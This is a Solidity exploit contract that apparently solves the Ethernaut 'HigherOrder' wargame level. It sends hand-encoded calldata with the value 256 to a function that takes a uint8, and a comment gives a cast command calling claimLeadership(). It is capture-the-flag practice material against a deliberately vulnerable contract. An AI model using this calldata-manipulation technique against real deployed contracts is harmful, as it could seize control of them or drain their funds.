//SPDX-License-Identifier: MIT
pragma solidity 0.8.20;
import {HigherOrder} from "./HigherOrder.sol";

contract HigherOrderAttack {
    HigherOrder victim;
    
    constructor(address _v) {
        victim = HigherOrder(_v);
    // Assume the victim contract is deployed at some address
    
    // Manually encode the calldata
    bytes4 selector = bytes4(keccak256("registerTreasury(uint8)"));
    bytes memory data = abi.encodePacked(selector, uint256(256));

    // Send the crafted calldata to the victim contract
    (bool success, ) = address(victim).call(data);
    require(success, "Call failed");
    //also i set the version of HigherOrder to match my version here, to make it more convenient, doesnt affect the result because im interacting  with contract deployed from ethernaut.
    //cast send <0x.. HigherOrder Contract from ethernaut> "claimLeadership()" --rpc-url $RPC --private-key $KEY  
    // yaay you passed.

    }
}